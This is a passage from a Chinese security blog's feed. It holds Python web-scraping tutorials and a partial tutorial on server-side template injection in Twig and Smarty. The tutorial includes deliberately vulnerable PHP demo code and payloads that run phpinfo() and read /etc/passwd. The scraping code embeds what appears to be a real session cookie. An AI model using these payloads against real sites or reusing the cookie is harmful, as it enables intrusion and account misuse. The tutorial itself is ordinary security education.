class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://dianying.taobao.com/cityAction.json?activityId&amp;_ksTS=1660476866218_108&amp;jsoncallback=jsonp109&amp;action=cityAction&amp;n_s=new&amp;event_submit_doGetAllRegion=true&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment"># &#x27;:authority&#x27;: &#x27;dianying.taobao.com&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:method&#x27;: &#x27;GET&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:path&#x27;: &#x27;/cityAction.json?activityId&amp;_ksTS=1660476866218_108&amp;jsoncallback=jsonp109&amp;action=cityAction&amp;n_s=new&amp;event_submit_doGetAllRegion=true&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:scheme&#x27;: &#x27;https&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;accept-encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bx-v&#x27;</span>: <span class="string">&#x27;2.2.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;cna=/2aWGsWi/loCAXAx9pQ8UTSC; miid=684269234985765900; enc=9HDdNFs5gyOQuzdApfEJPk50Cwf%2FlLh9K%2Fiabx9RI%2BBmo2QtS59XpwW8aETF8t%2B%2B6MYMx88YU%2BS8L4go%2BGzwGGiL83ltVyw%2BBnInqwnsUeKKaZ8gFHx9AjTGjM%2BRdo7e; thw=cn; _m_h5_tk=ec3acd5ea85c2c22f19dfdd9c5e72e6a_1660287437842; _m_h5_tk_enc=a68b03acb80f902b4d2403082acdfcac; t=fc3a35a1949a5061d43a8ad7a0aa32e6; cookie2=1b381909a7657c7e522221e067a1186f; v=0; _tb_token_=e7e0101153be8; xlly_s=1; l=eBxmMRGgLLqMpU8MBOfanurza77O8IRYmuPzaNbMiOCPO55H5AxcW6YtVWYMCnGVh6PeR3k0hW66BeYBqC2sjqj2nAHOr3Dmn; tfstk=croRBJ_31IAugGz_RYL08pVLpjvGZF68tTNdvD7Lz7senRsdiAniXYuwPJPawKC..; isg=BLa23tHByPmhSbxqKPOUAR5xB-y41_oRIlkEAyCf8hk0Y1b9iGaOIVUdez8PT_Ip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://dianying.taobao.com/index.htm?n_s=new&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Chromium&quot;;v=&quot;104&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;104&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-requested-with&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = content.split(<span class="string">&#x27;(&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;)&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;taopp.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">obj = json.load(<span class="built_in">open</span>(<span class="string">&#x27;taopp.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">city_list = jsonpath.jsonpath(obj,<span class="string">&#x27;$..regionName&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(city_list)</span><br></pre></td></tr></table></figure><br><h4 id="三、bs4"><a href="#三、bs4" class="headerlink" title="三、bs4"></a>三、bs4</h4><h5 id="1、bs4-基本使用"><a href="#1、bs4-基本使用" class="headerlink" title="1、bs4 基本使用"></a>1、bs4 基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;b1&quot;</span> <span class="attr">title</span>=<span class="string">&quot;a1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;l1&quot;</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>王五<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>赵六<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>钱七<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="built_in">open</span>(<span class="string">&#x27;06_解析_bs4之基本使用.html&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>),<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(soup)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bs4 的一些函数</span></span><br><span class="line"><span class="comment"># (1)find</span></span><br><span class="line"><span class="comment"># 返回的是第一个符合条件的数据</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;div&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据标签的值来找对应的标签对象</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;li&#x27;,title=&#x27;a1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据class标签来找到对应的标签对象</span></span><br><span class="line"><span class="comment"># class 不能直接用,要用 class_</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;li&#x27;,class_=&#x27;l1&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)find_all</span></span><br><span class="line"><span class="comment"># 找到所有标签的数据 返回的值是列表类型</span></span><br><span class="line"><span class="comment"># print(soup.find_all(&#x27;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多个标签查询要加中括号[]</span></span><br><span class="line"><span class="comment"># print(soup.find_all([&#x27;li&#x27;,&#x27;span&#x27;]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># limit 的作用是查找前几个</span></span><br><span class="line"><span class="comment"># print(soup.find_all(&#x27;li&#x27;,limit=2))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)select</span></span><br><span class="line"><span class="comment"># 返回多个数据 返回的是列表类型</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过 . 表示class 这种操作称为类选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;.l1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过 # 代表id</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;#b1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 属性选择器</span></span><br><span class="line"><span class="comment"># 查找li标签中含有id的标签</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li[id]&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找指定id标签</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li[id=&quot;b1&quot;]&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 层级选择器</span></span><br><span class="line"><span class="comment"># 后代选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;div li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子代选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;div &gt; ul &gt;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询多个标签数据</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li,span&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点信息</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;#b1&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.string)</span></span><br><span class="line"><span class="comment"># print(obj.get_text())</span></span><br><span class="line"><span class="comment"># 如果标签对象中 只有内容 那么string和get_text()都可以使用</span></span><br><span class="line"><span class="comment"># 如果标签对象中 除了内容还有标签 那么string就获取不到数据 而get_text()是可以获取数据的</span></span><br><span class="line"><span class="comment"># 一般情况下 推荐使用get_text()</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;div&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.string)</span></span><br><span class="line"><span class="comment"># print(obj.get_text())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点的属性</span></span><br><span class="line"><span class="comment"># name是标签的名字</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;#b1&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.name)</span></span><br><span class="line"><span class="comment"># 将属性值作为一个字典返回</span></span><br><span class="line"><span class="comment"># print(obj.attrs)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取节点的属性</span></span><br><span class="line"><span class="comment"># print(obj.attrs.get(&#x27;class&#x27;))</span></span><br></pre></td></tr></table></figure><h5 id="2、bs4-星巴克菜单"><a href="#2、bs4-星巴克菜单" class="headerlink" title="2、bs4 星巴克菜单"></a>2、bs4 星巴克菜单</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.starbucks.com.cn/menu/&#x27;</span></span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(url)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(content,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># //ul[@class=&quot;grid padded-3 product&quot;]//strong</span></span><br><span class="line">name_list = soup.select(<span class="string">&#x27;ul[class=&quot;grid padded-3 product&quot;] strong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="built_in">print</span>(name.get_text())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;解析&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="http://blog.hvvl404.fun/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-05-12T12:29:54.596Z</published>
    <updated>2023-05-25T05:52:42.022Z</updated>
    
    <content type="html"><![CDATA[<p>Java反序列化</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E7%88%86%E7%A0%B4/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E7%88%86%E7%A0%B4/</id>
    <published>2023-05-12T12:29:41.413Z</published>
    <updated>2023-05-12T12:29:41.413Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/PHP%E7%89%B9%E6%80%A7/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/PHP%E7%89%B9%E6%80%A7/</id>
    <published>2023-05-12T12:29:27.219Z</published>
    <updated>2023-05-12T12:29:27.219Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/NodeJS%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/NodeJS%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:28:28.863Z</published>
    <updated>2023-05-12T12:28:28.863Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:28:12.945Z</published>
    <updated>2023-05-23T15:07:13.259Z</updated>
    
    <content type="html"><![CDATA[<p>SSTI模板注入</p><span id="more"></span><h2 id="一、模板引擎"><a href="#一、模板引擎" class="headerlink" title="一、模板引擎"></a>一、模板引擎</h2><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><br><h2 id="二、什么是SSTI模板注入？"><a href="#二、什么是SSTI模板注入？" class="headerlink" title="二、什么是SSTI模板注入？"></a>二、什么是SSTI模板注入？</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web  应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p><br><h2 id="三、模板注入"><a href="#三、模板注入" class="headerlink" title="三、模板注入"></a>三、模板注入</h2><h3 id="1、PHP-的-SSTI"><a href="#1、PHP-的-SSTI" class="headerlink" title="1、PHP 的 SSTI"></a>1、PHP 的 SSTI</h3><h4 id="（1）Twig"><a href="#（1）Twig" class="headerlink" title="（1）Twig"></a>（1）Twig</h4><p>简单的环境搭建代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../Twig-1.35.3/lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span>=<span class="variable">$loader</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);<span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（2）Smarty"><a href="#（2）Smarty" class="headerlink" title="（2）Smarty"></a>（2）Smarty</h4><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)。但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p><p>利用介绍：</p><h5 id="1、版本查看"><a href="#1、版本查看" class="headerlink" title="1、版本查看"></a>1、版本查看</h5><p>获取  Smarty  的版本信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure><h5 id="2、代码执行（Smarty-lt-3-1）"><a href="#2、代码执行（Smarty-lt-3-1）" class="headerlink" title="2、代码执行（Smarty&lt;3.1）"></a>2、代码执行（Smarty&lt;3.1）</h5><p>Smarty  支持使用标签  {php}{&#x2F;php}，但是在 Smarty 3.1 之后就不适用了，会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;</span><br></pre></td></tr></table></figure><h5 id="3、静态方法（Smarty-lt-3-1-30）"><a href="#3、静态方法（Smarty-lt-3-1-30）" class="headerlink" title="3、静态方法（Smarty&lt;3.1.30）"></a>3、静态方法（Smarty&lt;3.1.30）</h5><p>通过self获取Smarty类再调用其静态方法实现文件读写。Smarty类的getStreamVariable方法的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，payload  如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>但是该静态方法在  Smarty  3.1.30  已经被删除了，所以如果在  Smarty  3.1.30  执行上述  payload 会报错。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;header.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（3）Blade"><a href="#（3）Blade" class="headerlink" title="（3）Blade"></a>（3）Blade</h4>]]></content>
    
    
    <summary type="html">&lt;p&gt;SSTI模板注入&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-05-12T12:27:38.664Z</published>
    <updated>2023-05-12T12:27:38.664Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>XXE外部实体注入</title>
